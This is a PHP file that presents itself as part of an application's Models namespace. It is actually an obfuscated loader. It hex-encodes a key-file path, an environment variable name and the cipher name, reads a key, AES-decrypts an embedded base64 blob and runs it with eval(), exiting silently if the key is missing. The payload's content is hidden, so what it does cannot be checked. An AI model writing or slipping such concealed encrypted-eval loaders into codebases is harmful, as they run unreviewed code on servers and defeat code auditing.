<?php
namespace App\Models;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('XLZ61kWP8PMDY6ilcaE2MQ==');

$c=base64_decode(

'nPIG5+5AGXfPc2m51SVHUKZjyJdchMPyjhBChlsPAbREcJ6dgQ2kbpCEjgjMbDCu/ML8ZktrDDJe' .
'p+Pb//bJ4KCRh/1QgwFyKMVzSmBoKkSSneeooU5y+6MZEmFC5bl7vT7TRUFAT4lZGxygJmWqAeF2' .
'PsT21in2jYFaUUTG0IyVFE9S3HBgeaV82GPUNx1Sj3ta3uqqZE43ky/QRG3zC8BY8QKbdXH6BhqC' .
'c1sEHYXX53iqGHLFkYSuK4yPV1WASPs4CL55TYIdoxLOzPwTxWY1jsWjTJebR0axSdsEpWrxRUiO' .
'XfGSZRkS1Yhsxh0nAVEZOLARzZwbZr7K0pqnGC5kb2/nScXOZr60F8urzqAAXqybQ556c0u736Ep' .
'NpMl35oXYCeSJjKleyZOvuGDBCDtnC5KSUanknZn0mijPAD/5ADi58w2nSIKEhJlodELpAKn+c2B' .
'5ovu0Vk7zE51qPrk89Mz0EhnJyDCiP46apfIadbZbLJHgyp/FyZb6c3ARL2HLRxDoMhC++KdaVrv' .
'0ypWs0IyHB38A16EYqDtVjMVTECVsjfuQ30XyxxX2ZNlch3J22ajEMiwQcah2L/MJRxnlSuUNuF2' .
'500jjcRDbZFJc/qQ0cDCuupmbgLSCu0OMZ3LFDE1WG3NOjLXt9VSpcEeLSDGU35WLDvohJqE+6hR' .
'7It3wagM9JyDvoUw2PVTMCPksTlRopL4LlEOTUl/b2Fa7SlyWmot+x2oLgXKPSX+bFwuGb1iGXGC' .
'19QblV6nMkwvIfSdFAj8XXTXvR54VJbi9B24thpwaBoQZY3HIQp8jwqgu50Fi4wmKIQPf+ghXdGS' .
'8uCvYlWcDfMwxvGvurnlidtK0ruOhpw+yYALFm+xoM3tg3THBjlRcarx5kteAlIeY0AQESKFAdaz' .
'6txO+g=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

